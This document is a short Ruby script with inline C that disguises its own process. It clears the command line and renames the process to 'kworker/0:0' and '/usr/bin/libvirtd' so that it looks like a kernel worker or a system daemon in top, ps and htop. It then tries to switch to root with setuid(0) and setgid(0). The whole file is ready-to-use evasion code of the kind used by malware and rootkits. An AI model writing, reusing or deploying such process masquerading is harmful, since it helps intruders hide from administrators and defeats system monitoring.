require 'rubygems'
require 'inline'

#Mask for when viewing processes within 'htop'
HTOP_MASK = "/usr/bin/libvirtd"
#Mask for when viewing processes within 'top' or 'ps'
TOP_MASK = "kworker/0:0"

class Mask
  inline do |builder|
    builder.include'<stdio.h>'
    builder.include'<string.h>'
    builder.include'<unistd.h>'
    builder.include'<sys/types.h>'
    builder.include'<sys/prctl.h>'
    builder.c'
     void mask_proc(char* exec_cmd, char* mask) {
        /* mask the process name */
        memset(exec_cmd, 0, strlen(exec_cmd));
        prctl(PR_SET_NAME, mask, 0, 0);

        /* change the UID/GID to 0 (raise privs) */
        if(setuid(0) != 0) {
          perror("setuid failed");
          exit(1);
        }
        if(setgid(0) != 0) {
          perror("setgid failed");
          exit(1);
        }
      }
    '
  end
end

Mask.new.mask_proc($PROGRAM_NAME, TOP_MASK)
$0 =HTOP_MASK
